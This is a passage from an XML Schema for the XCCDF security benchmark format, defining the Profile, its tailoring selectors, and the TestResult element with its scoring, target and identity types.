        <xsd:unique name="refineRuleKey">
            <xsd:selector xpath="./cdf:refine-rule"/>
            <xsd:field xpath="@idref"/>
        </xsd:unique>
        <xsd:unique name="refineValueKey">
            <xsd:selector xpath="./cdf:refine-value"/>
            <xsd:field xpath="@idref"/>
        </xsd:unique>
        <xsd:unique name="setValueKey">
            <xsd:selector xpath="./cdf:set-value"/>
            <xsd:field xpath="@idref"/>
        </xsd:unique>
    </xsd:element>

    <xsd:complexType name="profileType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:Profile&gt; element, which
                holds a specific tailoring of the &lt;xccdf:Benchmark&gt;. The main part of an
                &lt;xccdf:Profile&gt; is the selectors: &lt;xccdf:select&gt;,
                &lt;xccdf:set-value&gt;, &lt;xccdf:set-complex-value&gt;, &lt;xccdf:refine-rule&gt;,
                and &lt;xccdf:refine-value&gt;. An &lt;xccdf:Profile&gt; may also be signed with an
                XML-Signature. </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:element ref="cdf:status" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Status of the &lt;xccdf:Profile&gt; and date at
                        which it attained that status. Authors may use this element to record the
                        maturity or consensus level of an &lt;xccdf:Profile&gt;. If the
                        &lt;xccdf:status&gt; is not given explicitly, then the &lt;xccdf:Profile&gt;
                        is taken to have the same status as its parent
                        &lt;xccdf:Benchmark&gt;.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="dc-status" minOccurs="0" maxOccurs="unbounded"
                type="cdf:dc-statusType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Holds additional status information using the
                        Dublin Core format.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="version" type="cdf:versionType" minOccurs="0" maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Version information about this
                        &lt;xccdf:Profile&gt;. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="title" type="cdf:textWithSubType" minOccurs="1" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Title of the &lt;xccdf:Profile&gt;.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="description" type="cdf:htmlTextWithSubType" minOccurs="0"
                maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Text that describes the &lt;xccdf:Profile&gt;.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="reference" type="cdf:referenceType" minOccurs="0"
                maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A reference where the user can learn more about
                        the subject of this &lt;xccdf:Profile&gt;.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="platform" type="cdf:overrideableCPE2idrefType" minOccurs="0"
                maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A target platform for this
                        &lt;xccdf:Profile&gt;. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:choice minOccurs="0" maxOccurs="unbounded">
                <xsd:element name="select" minOccurs="0" type="cdf:profileSelectType">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Select or deselect &lt;xccdf:Group&gt; and
                            &lt;xccdf:Rule&gt; elements. </xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="set-complex-value" minOccurs="0"
                    type="cdf:profileSetComplexValueType">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Set the value of an &lt;xccdf:Value&gt; to
                            a list.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="set-value" minOccurs="0" type="cdf:profileSetValueType">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Set the value of an &lt;xccdf:Value&gt; to
                            a simple data value.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="refine-value" minOccurs="0" type="cdf:profileRefineValueType">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Customize the properties of an
                            &lt;xccdf:Value&gt;.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="refine-rule" minOccurs="0" type="cdf:profileRefineRuleType">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Customize the properties of an
                            &lt;xccdf:Rule&gt; or &lt;xccdf:Group&gt;.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
            </xsd:choice>
            <xsd:element name="metadata" type="cdf:metadataType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Metadata associated with this
                        &lt;xccdf:Profile&gt;.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="signature" type="cdf:signatureType" minOccurs="0" maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A digital signature asserting authorship and
                        allowing verification of the integrity of the
                        &lt;xccdf:Profile&gt;.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:sequence>
        <xsd:attribute name="id" type="cdf:profileIdType" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Unique identifier for this
                    &lt;xccdf:Profile&gt;.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="prohibitChanges" type="xsd:boolean" default="false" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Whether or not products should prohibit changes to
                    this &lt;xccdf:Profile&gt;.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="abstract" type="xsd:boolean" default="false" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">If true, then this &lt;xccdf:Profile&gt; exists
                    solely to be extended by other &lt;xccdf:Profile&gt; elements.
                </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="note-tag" type="xsd:NCName" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Tag identifier to specify which
                    &lt;xccdf:profile-note&gt; element from an &lt;xccdf:Rule&gt; should be
                    associated with this &lt;xccdf:Profile&gt;.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="extends" type="xsd:NCName" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The id of an &lt;xccdf:Profile&gt; on which to base
                    this &lt;xccdf:Profile&gt;.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute ref="xml:base"/>
        <xsd:attribute name="Id" type="xsd:ID" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">An identifier used for referencing elements
                    included in an XML signature.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <!-- ************************************************************** -->
    <!-- ***************  Profile-related Types *********************** -->
    <!-- ************************************************************** -->
    <xsd:complexType name="profileSelectType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Type for the &lt;xccdf:select&gt; element in an
                &lt;xccdf:Profile&gt;. This element designates an &lt;xccdf:Rule&gt;,
                &lt;xccdf:Group&gt;, or cluster of &lt;xccdf:Rule&gt; and &lt;xccdf:Group&gt;
                elements and overrides the @selected attribute on the designated items, providing a
                means for including or excluding &lt;xccdf:Rule&gt; elements from an
                assessment.</xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:element name="remark" type="cdf:textType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Explanatory material or other
                        prose.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:sequence>
        <xsd:attribute name="idref" type="xsd:NCName" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The @id value of an &lt;xccdf:Rule&gt; or
                    &lt;xccdf:Group&gt;, or the @cluster-id value of one or more &lt;xccdf:Rule&gt;
                    or &lt;xccdf:Group&gt; elements. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="selected" type="xsd:boolean" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The new value for the indicated item's @selected
                    property. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="profileSetValueType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Type for the &lt;xccdf:set-value&gt; element in an
                &lt;xccdf:Profile&gt;. This element upports the direct specification of simple value
                types such as numbers, strings, and boolean values. This overrides the
                &lt;xccdf:value&gt; and &lt;xccdf:complex-value&gt; element(s) of an
                &lt;xccdf:Value&gt; element.</xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:string">
                <xsd:attribute name="idref" type="xsd:NCName" use="required">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The @id value of an &lt;xccdf:Value&gt; or
                            the @cluster-id value of one or more &lt;xccdf:Value&gt; elements
                        </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>

    <xsd:complexType name="profileSetComplexValueType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Type for the &lt;xccdf:set-complex-value&gt; element
                in an &lt;xccdf:Profile&gt;. This element supports the direct specification of
                complex value types such as lists. Zero or more &lt;xccdf:item&gt; elements may
                appear as children of this element; if no child elements are present, this element
                represents an empty list. This overrides the &lt;xccdf:value&gt; and
                &lt;xccdf:complex-value&gt; element(s) of an &lt;xccdf:Value&gt;
                element.</xsd:documentation>
        </xsd:annotation>
        <xsd:complexContent>
            <xsd:extension base="cdf:complexValueType">
                <xsd:attribute name="idref" type="xsd:NCName" use="required">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The @id value of an &lt;xccdf:Value&gt; or
                            the @cluster-id value of one or more &lt;xccdf:Value&gt; elements
                        </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:complexContent>
    </xsd:complexType>

    <xsd:complexType name="profileRefineValueType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Type for the &lt;xccdf:refine-value&gt; element in an
                &lt;xccdf:Profile&gt;. This element designates the &lt;xccdf:Value&gt; constraints
                to be applied during tailoring for an &lt;xccdf:Value&gt; element or the
                &lt;xccdf:Value&gt; members of a cluster. </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:element name="remark" type="cdf:textType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Explanatory material or other
                        prose.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:sequence>
        <xsd:attribute name="idref" type="xsd:NCName" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The @id value of an &lt;xccdf:Value&gt; or the
                    @cluster-id value of one or more &lt;xccdf:Value&gt; elements
                </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="selector" type="xsd:string" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Holds a selector value corresponding to the value
                    of a @selector property in an &lt;xccdf:Value&gt; element's child properties.
                    Properties with a matching @selector are considered active and all other
                    properties are inactive. This may mean that, after selector application, some
                    classes of &lt;xccdf:Value&gt; properties will be completely inactive because
                    none of those properties had a matching @selector. The only exception is the
                    &lt;xccdf:value&gt; and &lt;xccdf:complex-value&gt; properties of an
                    &lt;xccdf:Value&gt; element - if there is no &lt;xccdf:value&gt; or
                    &lt;xccdf:complex-value&gt; property with a matching @selector value then the
                    &lt;xccdf:value&gt;/&lt;xccdf:complex-value&gt; property with an empty or absent
                    @selector attribute becomes active. If there is no such &lt;xccdf:value&gt; or
                    &lt;xccdf:complex-value&gt;, then the first &lt;xccdf:value&gt; or
                    &lt;xccdf:complex-value&gt; listed in the XML becomes active. This reflects the
                    fact that all &lt;xccdf:Value&gt; elements require an active value property at
                    all times. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="operator" type="cdf:valueOperatorType" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The new value for the identified
                    &lt;xccdf:Value&gt; element's @operator property. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="profileRefineRuleType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Type for the &lt;xccdf:refine-rule&gt; element in an
                &lt;xccdf:Profile&gt;. A &lt;xccdf:refine-rule&gt; element allows the author to
                select &lt;xccdf:check&gt; statements and override the @weight, @severity, and @role
                of an &lt;xccdf:Rule&gt;, &lt;xccdf:Group&gt;, or cluster of &lt;xccdf:Rule&gt; and
                &lt;xccdf:Group&gt; elements. Despite the name, this selector does apply for
                &lt;xccdf:Group&gt; elements and for clusters that include &lt;xccdf:Group&gt;
                elements, but it only affects their @weight attribute. </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:element name="remark" type="cdf:textType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Explanatory material or other
                        prose.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:sequence>
        <xsd:attribute name="idref" type="xsd:NCName" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The @id value of an &lt;xccdf:Rule&gt; or
                    &lt;xccdf:Group&gt;, or the @cluster-id value of one or more &lt;xccdf:Rule&gt;
                    or &lt;xccdf:Group&gt; elements. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="weight" type="cdf:weightType" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The new value for the identified element's @weight
                    property. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="selector" type="xsd:string" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Holds a selector value corresponding to the value
                    of a @selector property in an &lt;xccdf:Rule&gt; element's &lt;xccdf:check&gt;
                    element. If the selector specified does not match any of the @selector
                    attributes specified on any of the &lt;xccdf:check&gt; children of an
                    &lt;xccdf:Rule&gt;, then the &lt;xccdf:check&gt; child element without a
                    @selector attribute is used. If there is no child without a @selector attribute,
                    then that Rule would have no effective &lt;xccdf:check&gt;
                    element.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="severity" type="cdf:severityEnumType" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The new value for the identified &lt;xccdf:Rule&gt;
                    element's @severity property. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="role" type="cdf:roleEnumType" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The new value for the identified &lt;xccdf:Rule&gt;
                    element's @role property. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <!-- ************************************************************** -->
    <!-- *******************  TestResult Element  ********************* -->
    <!-- ************************************************************** -->
    <xsd:element name="TestResult" type="cdf:testResultType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">The &lt;xccdf:TestResult&gt; element encapsulates the
                results of a single application of an &lt;xccdf:Benchmark&gt; to a single target
                platform. The &lt;xccdf:TestResult&gt; element normally appears as the child of the
                &lt;xccdf:Benchmark&gt; element, although it may also appear as the top-level
                element of an XCCDF results document. XCCDF is not intended to be a database format
                for detailed results; the &lt;xccdf:TestResult&gt; element offers a way to store the
                results of individual tests in modest detail, with the ability to reference
                lower-level testing data.</xsd:documentation>
        </xsd:annotation>
    </xsd:element>

    <xsd:complexType name="testResultType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:TestResult&gt; element,
                which holds the results of one application of the &lt;xccdf:Benchmark&gt;. The
                &lt;xccdf:TestResult&gt; element normally appears as the child of the
                &lt;xccdf:Benchmark&gt; element, although it may also appear as the top-level
                element of an XCCDF results document. XCCDF is not intended to be a database format
                for detailed results; the &lt;xccdf:TestResult&gt; element offers a way to store the
                results of individual tests in modest detail, with the ability to reference
                lower-level testing data. Although several of the child elements of this type
                technically support the @override attribute, the &lt;xccdf:TestResult&gt; element
                cannot be extended. Therefore, @override has no meaning within an
                &lt;xccdf:TestResult&gt; element and its children, and should not be used for
                them.</xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:element name="benchmark" minOccurs="0" maxOccurs="1"
                type="cdf:benchmarkReferenceType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Reference to the &lt;xccdf:Benchmark&gt; for
                        which the &lt;xccdf:TestResult&gt; records results. This property is
                        required if this &lt;xccdf:TestResult&gt; element is the top-level element
                        and optional otherwise.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="tailoring-file" minOccurs="0" maxOccurs="1"
                type="cdf:tailoringReferenceType">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The tailoring file element contains attributes
                        used to identify an &lt;xccdf:Tailoring&gt; element used to guide the
                        assessment reported on in this &lt;xccdf:TestResult&gt;. The tailoring
                        element is required in an &lt;xccdf:TestResult&gt; if and only if an
                        &lt;xccdf:Tailoring&gt; element guided the assessment recorded in the
                        &lt;xccdf:TestResult&gt; or if the &lt;xccdf:Tailoring&gt; element records
                        manual tailoring actions applied to this assessment. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="title" type="cdf:textType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Title of the test.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="remark" type="cdf:textType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A remark about the test, possibly supplied by
                        the person administering the &lt;xccdf:Benchmark&gt;
                        assessment</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="organization" type="xsd:string" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The name of the organization or other entity
                        responsible for applying this &lt;xccdf:Benchmark&gt; and generating this
                        result. When multiple &lt;xccdf:organization&gt; elements are used to
                        indicate multiple organization names in a hierarchical organization, the
                        highest-level organization should appear first. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="identity" type="cdf:identityType" minOccurs="0" maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Information about the system identity or user
                        employed during application of the &lt;xccdf:Benchmark&gt;. If used,
                        specifies the name of the authenticated identity.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="profile" type="cdf:idrefType" minOccurs="0" maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The &lt;xccdf:profile&gt; element holds the
                        value of the @id attribute value of the &lt;xccdf:Profile&gt; selected to be
                        used in the assessment reported on by this &lt;xccdf:TestResult&gt;. This
                        &lt;xccdf:Profile&gt; might be from the &lt;xccdf:Benchmark&gt; or from an
                        &lt;xccdf:Tailoring&gt; file, if used. This element should appear if and
                        only if an &lt;xccdf:Profile&gt; was selected to guide the
                        assessment.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="target" type="xsd:string" minOccurs="1" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Name or description of the target system whose
                        test results are recorded in the &lt;xccdf:TestResult&gt; element (the
                        system to which an &lt;xccdf:Benchmark&gt; test was applied). Each
                        appearance of the element supplies a name by which the target host or device
                        was identified at the time the test was run. The name may be any string, but
                        applications should include the fully qualified DNS name whenever possible.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="target-address" type="xsd:string" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">Network address of the target system to which
                        an &lt;xccdf:Benchmark&gt; test was applied. Typical forms for the address
                        include IP version 4 (IPv4), IP version 6 (IPv6), and Ethernet media access
                        control (MAC).</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="target-facts" type="cdf:targetFactsType" minOccurs="0" maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A list of named facts about the target system
                        or platform. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:choice minOccurs="0" maxOccurs="unbounded">
                <xsd:element name="target-id-ref" type="cdf:targetIdRefType">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">References to external structures with
                            identifying information about the target of this
                            assessment.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:any namespace="##other" processContents="lax">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Identifying information expressed in other
                            XML formats can be included here. </xsd:documentation>
                    </xsd:annotation>
                </xsd:any>
            </xsd:choice>
            <xsd:element name="platform" type="cdf:CPE2idrefType" minOccurs="0"
                maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A platform on the target system. There should
                        be one instance of this property for every platform that the target system
                        was found to meet. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:choice minOccurs="0" maxOccurs="unbounded">
                <xsd:element name="set-value" type="cdf:profileSetValueType" minOccurs="1"
                    maxOccurs="1">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Specific setting for a single
                            &lt;xccdf:Value&gt; element used during the test.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
                <xsd:element name="set-complex-value" type="cdf:profileSetComplexValueType"
                    minOccurs="1" maxOccurs="1">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Specific setting for a single
                            &lt;xccdf:Value&gt; element used during the test when the given value is
                            set to a complex type, such as a list.</xsd:documentation>
                    </xsd:annotation>
                </xsd:element>
            </xsd:choice>
            <xsd:element name="rule-result" type="cdf:ruleResultType" minOccurs="0"
                maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">The result of a single instance of an
                        &lt;xccdf:Rule&gt; application against the target. The
                        &lt;xccdf:TestResult&gt; must include at least one &lt;xccdf:rule-result&gt;
                        record for each &lt;xccdf:Rule&gt; that was selected in the resolved
                        &lt;xccdf:Benchmark&gt;.</xsd:documentation>
                </xsd:annotation>
                <!-- Each context name in an instance must be unique. -->
                <xsd:key name="instanceContextKey">
                    <xsd:selector xpath="cdf:instance"/>
                    <xsd:field xpath="@context"/>
                </xsd:key>
                <!-- parentContext must refer to valid sibling context -->
                <xsd:keyref name="parentKeyRef" refer="cdf:instanceContextKey">
                    <xsd:selector xpath="./cdf:instance"/>
                    <xsd:field xpath="@parentContext"/>
                </xsd:keyref>
            </xsd:element>
            <xsd:element name="score" type="cdf:scoreType" minOccurs="1" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">An overall score for this
                        &lt;xccdf:Benchmark&gt; test. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="metadata" type="cdf:metadataType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">XML metadata associated with this
                        &lt;xccdf:TestResult&gt;. </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
            <xsd:element name="signature" type="cdf:signatureType" minOccurs="0" maxOccurs="1">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A digital signature asserting authorship and
                        allowing verification of the integrity of the &lt;xccdf:TestResult&gt;.
                    </xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:sequence>
        <xsd:attribute name="id" type="cdf:testresultIdType" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Unique identifier for this
                    element.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="start-time" type="xsd:dateTime" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Time when testing began.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="end-time" type="xsd:dateTime" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Time when testing was completed and the results
                    recorded. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="test-system" type="xsd:string" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Name of the benchmark consumer program that
                    generated this &lt;xccdf:TestResult&gt; element; should be either a CPE name or
                    a CPE applicability language expression.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="version" type="xsd:string" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The version number string copied from the
                    &lt;xccdf:Benchmark&gt; used to direct this assessment. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="Id" type="xsd:ID" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">An identifier used for referencing elements
                    included in an XML signature.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="benchmarkReferenceType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Type for a reference to the &lt;xccdf:Benchmark&gt;
                document. </xsd:documentation>
        </xsd:annotation>
        <xsd:attribute name="href" type="xsd:anyURI" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The URI of the &lt;xccdf:Benchmark&gt; document.
                </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="id" type="xsd:NCName" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">The value of that &lt;xccdf:Benchmark&gt; element's
                    @id attribute. </xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="scoreType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Type for a score value in an &lt;xccdf:TestResult&gt;.
            </xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:decimal">
                <xsd:attribute name="system" type="xsd:anyURI" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">A URI indicating the scoring model used to
                            create this score. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="maximum" type="xsd:decimal" use="optional">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">The maximum possible score value that could
                            have been achieved under the named scoring system. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>

    <xsd:complexType name="targetFactsType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for the &lt;xccdf:target-facts&gt; elements
                in &lt;xccdf:TestResult&gt; elements. A &lt;xccdf:target-facts&gt; element holds a
                list of named facts about the target system or platform. Each fact is an element of
                type factType. Each &lt;xccdf:fact&gt; must have a name, but duplicate names are
                allowed. (For example, if you had a fact about MAC addresses, and the target system
                had three NICs, then you'd need three instances of the "urn:xccdf:fact:ethernet:MAC"
                fact.) </xsd:documentation>
        </xsd:annotation>
        <xsd:sequence>
            <xsd:element name="fact" type="cdf:factType" minOccurs="0" maxOccurs="unbounded">
                <xsd:annotation>
                    <xsd:documentation xml:lang="en">A named fact about the target system or
                        platform.</xsd:documentation>
                </xsd:annotation>
            </xsd:element>
        </xsd:sequence>
    </xsd:complexType>

    <xsd:complexType name="targetIdRefType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Type for an &lt;xccdf:target-id-ref&gt; element in an
                &lt;xccdf:TestResult&gt; element. This element contains references to external
                structures with identifying information about the target of an
                assessment.</xsd:documentation>
        </xsd:annotation>
        <xsd:attribute name="system" type="xsd:anyURI" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Indicates the language in which this identifying
                    information is expressed. If the identifying language uses XML namespaces, then
                    the @system attribute for the language should be its
                    namespace.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="href" type="xsd:string" use="required">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Points to the external resource (e.g., a file) that
                    contains the identifying information.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
        <xsd:attribute name="name" type="xsd:string" use="optional">
            <xsd:annotation>
                <xsd:documentation xml:lang="en">Identifies a specific structure within the
                    referenced file. If the @name attribute is absent, the reference is to the
                    entire resource indicated in the @href attribute.</xsd:documentation>
            </xsd:annotation>
        </xsd:attribute>
    </xsd:complexType>

    <xsd:complexType name="identityType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en">Type for an &lt;xccdf:identity&gt; element in an
                &lt;xccdf:TestResult&gt;. It contains information about the system identity or user
                employed during application of the &lt;xccdf:Benchmark&gt;. If used, shall specify
                the name of the authenticated identity. </xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:string">
                <xsd:attribute name="authenticated" type="xsd:boolean" use="required">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Whether the identity was authenticated with
                            the target system during the application of the &lt;xccdf:Benchmark&gt;.
                        </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
                <xsd:attribute name="privileged" type="xsd:boolean" use="required">
                    <xsd:annotation>
                        <xsd:documentation xml:lang="en">Whether the identity was granted
                            administrative or other special privileges beyond those of a normal
                            user. </xsd:documentation>
                    </xsd:annotation>
                </xsd:attribute>
            </xsd:extension>
        </xsd:simpleContent>
    </xsd:complexType>

    <xsd:complexType name="factType">
        <xsd:annotation>
            <xsd:documentation xml:lang="en"> Data type for an &lt;xccdf:fact&gt; element, which
                holds information about a target system: a name-value pair with a type. The content
                of the element is the value, and the @name attribute indicates the name. The @name
                is in the form of a URI that indicates the nature of the fact. A table of defined
                fact URIs appears in section 6.6.3 of the XCCDF specification. Additional URIs may
                be defined by authors to indicate additional kinds of facts. </xsd:documentation>
        </xsd:annotation>
        <xsd:simpleContent>
            <xsd:extension base="xsd:string">
